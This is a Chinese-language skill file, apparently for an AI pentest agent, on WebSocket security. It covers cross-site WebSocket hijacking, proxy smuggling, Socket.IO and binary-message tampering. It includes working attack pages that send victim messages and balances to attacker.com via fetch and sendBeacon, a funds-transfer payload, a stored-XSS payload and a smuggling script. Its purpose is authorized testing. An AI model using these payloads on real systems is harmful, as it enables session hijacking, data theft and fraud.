# 技能：WebSocket 安全

> **AI 加载指令**：本技能涵盖 WebSocket 协议基础、跨站 WebSocket 控制攻击（CSWSH）、实用工具桥接和常见漏洞类别。仅在 **授权** 测试中应用；将令牌和消息内容视为敏感信息。对于 REST/GraphQL 伴生测试，当工作区中存在 **[api-sec](../api-sec/SKILL.md)** 时，请交叉加载。

## 0. 快速入门

在代理或原始流量审查期间，注意观察：

```http
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Sec-WebSocket-Protocol: optional-subprotocol
```

服务器成功响应指示：

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

**路由说明**：在 Burp/浏览器开发者工具中，过滤 `101` 和 `Upgrade: websocket`；对于更深层次的 API 测试，通过 `api-sec` 对齐认证/授权模型。

---

## 1. 协议基础

### 客户端请求（典型）

- **`Upgrade: websocket`** 和 **`Connection: Upgrade`** — 必须的升级握手。
- **`Sec-WebSocket-Key`** — Base64 随机数；服务器使用魔法 GUID 哈希后响应 **`Sec-WebSocket-Accept`**。
- **`Sec-WebSocket-Version: 13`** — 当前浏览器互操作性的标准版本。

### 服务器响应

- **`HTTP/1.1 101 Switching Protocols`** — 握手完成；后续帧根据 RFC 是 WebSocket 二进制/文本帧。

最小概念流程：

```text
客户端：HTTP GET + Upgrade 头部
服务器：101 + Sec-WebSocket-Accept
通道：带框架的消息（文本/二进制）、ping/pong、关闭
```

---

## 2. 跨站 WebSocket 控制攻击（CSWSH）

### 条件

- 服务器在 WebSocket 握手时 **不验证 `Origin`**（或等效绑定），**并且**
- 受害者对目标网站有 **活动会话**（基于 cookie 或浏览器存储的凭证）。

然后，恶意页面在受害者的浏览器中打开 WebSocket **作为受害者**，类似于 CSRF，但针对 **持久双向通道**。

### 概念验证模式（实验室/授权目标仅限）

```javascript
const ws = new WebSocket('wss://vulnerable.example.com/messages');
ws.onopen = () => { ws.send('HELLO'); };
ws.onmessage = (event) => {
  fetch('https://attacker.example.net/?' + encodeURIComponent(event.data));
};
```

**测试说明**：确认是否检查 **`Origin`**，是否发送 **cookies**（`SameSite` 规则），是否需要 **子协议** 或 **自定义头部** — 缺少检查会增加 CSWSH 风险。

---

## 3. 工具测试

### wsrepl

```bash
pip install wsrepl
wsrepl -u wss://target.example.com/ws -P auth_plugin.py
```

使用 **插件** 重现浏览器 cookies、头部或 WebSocket 生命周期中的令牌刷新。

### ws-harness（桥接到 HTTP 以便其他工具使用）

```bash
python ws-harness.py -u "ws://127.0.0.1:8765/path" -m ./message.txt
```

示例下游使用与 SQL 注入工具桥接的 HTTP 表面（将 URL 调整为本地监听器）：

```bash
sqlmap -u "http://127.0.0.1:8000/?fuzz=test" --batch
```

### Burp Suite 生态系统

- **SocketSleuth** — 在 Burp 中检查和操作 WebSocket 流量。
- **WebSocket Turbo Intruder** — 高速率或脚本化消息模糊测试。

---

## 4. 常见漏洞

| 问题 | 重要性 |
|-------|----------------|
| 缺少 **`Origin`** 验证 | 使攻击者控制的页面能够执行 **CSWSH** |
| **URL 中的认证令牌** (`wss://host/ws?token=...`) | 日志、代理、Referer 泄露、浏览器历史记录 |
| **消息无速率限制** | 滥用、暴力破解、DoS |
| **使用 `ws://` 而不是 `wss://`** | 线路上明文（中间人攻击） |
| **消息体中的注入** | SQLi、命令注入或 XSS（如果内容被存储/反射） |

示例敏感 URL 反模式：

```text
wss://api.example.com/stream?access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

优先考虑 **`Sec-WebSocket-Protocol`**、**首次消息认证** 或 **cookie + CSRF 令牌** 模式，以符合产品约束。

---

## 5. 决策树

1. **识别端点** — 从 JS 包、Swagger 或 `101` 响应中；注意 `wss` 与 `ws` 的区别。
2. **握手审查** — **`Origin`**、**Host** 和 **Cookie** 策略是否正确？查询字符串中是否有令牌？
3. **会话绑定** — 在 Burp 中使用 **其他用户** 的 cookie 筐重新连接；比较订阅主题和数据泄露。
4. **CSWSH** — 加载一个 **本地 HTML** 页面，其中使用受害者会话连接到目标；验证服务器是否拒绝错误的 **Origin** 或使用非 cookie 密钥。
5. **消息语义** — 模糊 JSON/文本有效负载以进行注入；与 HTTP API 测试相同的逻辑。
6. **传输** — 在生产中标记 **`ws://`**；验证 TLS 和 HSTS 的对齐。

---

## 6. 相关路由

- 从 **[api-sec](../api-sec/SKILL.md)** — 认证、授权、IDOR 和速率限制通常 **镜像** 背后相同的 WebSocket 路由的 HTTP API。

**注意**：WebSocket 通常与 REST 共享会话和权限模型；使用 `api-sec` 对齐后端上的认证和资源边界。

---

## 7. CSWSH — 分步利用

### 第 1 步：确认 WebSocket 握手无 Origin 检查

```text
# 在 Burp 中：拦截 WebSocket 升级请求
# 修改 Origin 头部为：https://attacker.com
# 如果返回 101 Switching Protocols → 无 Origin 验证
# 如果返回 403/拒绝 → Origin 被检查（测试子域变体）
```

### 第 2 步：构建攻击页面

```html
<html>
<body>
<script>
const ws = new WebSocket('wss://target.com/ws');

ws.onopen = function() {
    // 以受害者身份建立连接（自动发送 cookies）
    console.log('Connected as victim');
    // 以受害者身份发送命令
    ws.send(JSON.stringify({action: 'get_profile'}));
    ws.send(JSON.stringify({action: 'list_messages'}));
};

ws.onmessage = function(event) {
    // 拦获所有接收到的消息
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: event.data
    });
};

ws.onerror = function(err) {
    fetch('https://attacker.com/error?e=' + encodeURIComponent(err));
};
</script>
</body>
</html>
```

### 第 3 步：cookies 和会话劫持

```text
WebSocket 的浏览器行为：
- 目标域的 cookies 会自动在升级请求中发送
- SameSite=None cookies 总是发送
- SameSite=Lax cookies：**不发送**（WebSocket 不是顶级导航）
- SameSite=Strict cookies：**不发送**

关键问题：会话 cookie 是 SameSite=None 还是传统（无 SameSite 属性）？
→ 传统 cookie 在现代 Chrome 中默认为 Lax，但在旧版浏览器中为 None
```

### 第 4 步：以受害者身份读取/写入消息

```javascript
// 攻击者可以读取和写入 WebSocket
// 读取：财务数据、私信、管理员命令
// 写入：转账资金、更改设置、以受害者身份发送消息

ws.onopen = () => {
    // 写入：以受害者身份执行操作
    ws.send(JSON.stringify({
        action: 'transfer',
        to: 'attacker_account',
        amount: 10000
    }));
};

ws.onmessage = (e) => {
    const data = JSON.parse(e.data);
    if (data.type === 'balance') {
        // 读取：泄露敏感数据
        navigator.sendBeacon('https://attacker.com/data',
            JSON.stringify(data));
    }
};
```

---

## 8. WebSocket 穿越器

### 概念

使用 WebSocket 升级绕过反向代理限制，然后通过 WebSocket 连接隧道传输任意 HTTP 流量。

### 基于升级的代理绕过

```text
1. 反向代理限制对 /admin 的访问（返回 403）
2. 客户端发送合法的 WebSocket 升级到 /ws
3. 代理允许升级（101 响应）
4. 升级后，代理停止检查连接（原始 TCP 转发）
5. 客户端通过“WebSocket”连接发送原始 HTTP 请求：
   GET /admin HTTP/1.1
   Host: backend-server
6. 后端处理 HTTP 请求 → 200 OK 带有 admin 内容
```

### H2-over-WebSocket 穿越器

```text
1. 通过 WebSocket 连接到目标
2. 升级后，通过 WebSocket 隧道发送 HTTP/2 前缀
3. 后端 HTTP/2 处理器处理走私请求
4. 绕过仅检查 HTTP/1.1 流量的 WAF/代理规则
```

### Python 实现

```python
import websocket
import ssl

ws = websocket.create_connection(
    'wss://target.com/ws',
    header=['Origin: https://target.com'],
    sslopt={"cert_reqs": ssl.CERT_NONE}
)

# 升级后，通过隧道发送原始 HTTP
smuggled_request = (
    b"GET /admin/users HTTP/1.1\r\n"
    b"Host: internal-backend\r\n"
    b"Connection: close\r\n\r\n"
)
ws.send(smuggled_request, opcode=0x2)  # 二进制帧
response = ws.recv()
print(response)
```

### 代理特定行为

| 代理 | WebSocket 隧道行为 |
|-------|--------------------------|
| Nginx | 升级后转发原始 TCP — 如果后端不验证 WebSocket 帧则可能走私 |
| HAProxy | 取决于 `option http-server-close` 与 `tunnel` 模式 |
| AWS ALB | 终止 WebSocket — 重框架流量，更难走私 |
| Cloudflare | 检查 WebSocket 帧 — 阻止原始 HTTP 走私 |
| Varnish | 本地不支持 WebSocket — 升级可能完全绕过缓存 |

---

## 9. Socket.IO 特定漏洞

### 命名空间注入

Socket.IO 支持命名空间（`/admin`、`/chat`）。如果认证仅在默认命名空间上：

```javascript
// 客户端连接到特权命名空间而不进行认证检查
const adminSocket = io('https://target.com/admin');
adminSocket.on('connect', () => {
    adminSocket.emit('list_users');
});

// 服务器可能不会验证客户端是否授权访问 /admin 命名空间
```

### 事件名称注入

如果事件名称由用户输入派生：

```javascript
// 服务器端易受攻击模式：
socket.on(userInput, handler);

// 攻击者发送匹配内部事件的事件名称：
socket.emit('__disconnect');     // 强制断开其他客户端
socket.emit('connection');        // 重新触发连接处理程序
socket.emit('error');             // 触发错误处理程序
```

### 确认回调滥用

Socket.IO 确认回调可以返回数据。如果服务器在确认回调中发送敏感数据：

```javascript
socket.emit('get_data', {id: 'admin'}, (response) => {
    // response 可能包含客户端不应访问的数据
    fetch('https://attacker.com/exfil', {
        method: 'POST',
        body: JSON.stringify(response)
    });
});
```

### 长轮询回退 CSRF

Socket.IO 在 WebSocket 不可用时回退到 HTTP 长轮询。轮询传输使用常规 HTTP 请求和 cookies → 如果没有额外的令牌验证，容易受到 CSRF 攻击：

```text
POST /socket.io/?EIO=4&transport=polling&sid=SESSION_ID
Content-Type: application/octet-stream

4{"type":2,"data":["transfer",{"to":"attacker","amount":1000}]}
```

---

## 10. WebSocket 消息注入

### 在拦截的连接中（`ws://` 的中间人攻击）

如果应用程序使用 `ws://`（未加密），同一网络上的攻击者可以注入消息：

```text
1. ARP 欺骗或网络位置拦截流量
2. 识别 TCP 流中的 WebSocket 帧
3. 在合法消息之间注入定制的帧
4. 客户端→服务器和服务器→客户端注入均可能
```

### 应用级注入

当 WebSocket 消息被连接或插值而没有进行清理时：

```javascript
// 易受攻击的服务器端处理程序：
socket.on('chat', (msg) => {
    // 如果 msg 包含 JSON 修饰符：
    broadcast(`{"user":"${username}","msg":"${msg}"}`);
    // 注入：msg = '","admin":true,"msg":"hacked'
    // 结果：{"user":"attacker","msg":"","admin":true,"msg":"hacked"}
});
```

### 通过 WebSocket 存储的 XSS

```text
1. 发送 WebSocket 消息：<img src=x onerror=alert(document.cookie)>
2. 服务器存储消息并广播给所有连接的客户端
3. 如果客户端将消息作为 HTML 渲染 → 存储的 XSS
4. 所有连接的用户同时受影响
```

---

## 11. 二进制 WebSocket 消息操作

### Protobuf 反序列化

使用 Protocol Buffers over WebSocket 的应用程序可能容易受到以下漏洞：

```text
1. 捕获二进制 WebSocket 帧
2. 解码 protobuf 结构（使用 protoc --decode_raw 或 protobuf-inspector）
3. 修改字段值（例如，更改 user_id、amount、role）
4. 重新编码并通过 WebSocket 发送修改后的帧
5. 服务器反序列化而不重新验证字段约束
```

```bash
# 解码捕获的二进制帧
echo "CAPTURED_HEX" | xxd -r -p | protoc --decode_raw

# 输出：字段结构及其类型和值
# 修改、重新编码、通过 WebSocket 发送回
```

### MessagePack 反序列化

```python
import msgpack
import websocket

ws = websocket.create_connection('wss://target.com/ws')

# 解码接收到的二进制消息
raw = ws.recv()
data = msgpack.unpackb(raw, raw=False)
# data = {'action': 'get_balance', 'user_id': 123}

# 修改并重新发送
data['user_id'] = 1  # IDOR：访问管理员余额
ws.send(msgpack.packb(data), opcode=0x2)
```

### 类型混淆攻击

二进制序列化格式可能允许类型混淆：

```text
# 原始：user_id 作为整数（字段类型 0）
# 修改：user_id 作为字符串 "1 OR 1=1"（字段类型 2）
# 如果服务器在反序列化后不验证类型 → SQL 注入

# 原始：is_admin 作为布尔值 false（0x00）
# 修改：is_admin 作为布尔值 true（0x01）
# 如果服务器信任反序列化值 → 直接权限提升
```

### 用于二进制 WebSocket 分析的工具

| 工具 | 目的 |
|------|---------|
| Burp Suite + SocketSleuth | 拦截和修改二进制帧 |
| `protobuf-inspector` | 解码未知 protobuf 结构 |
| `msgpack-tools` | Encode/decode MessagePack CLI |
| `wsdump` (websocket-client) | 原始帧捕获和重放 |
| Wireshark | 协议级别上的 WebSocket 帧解构 |
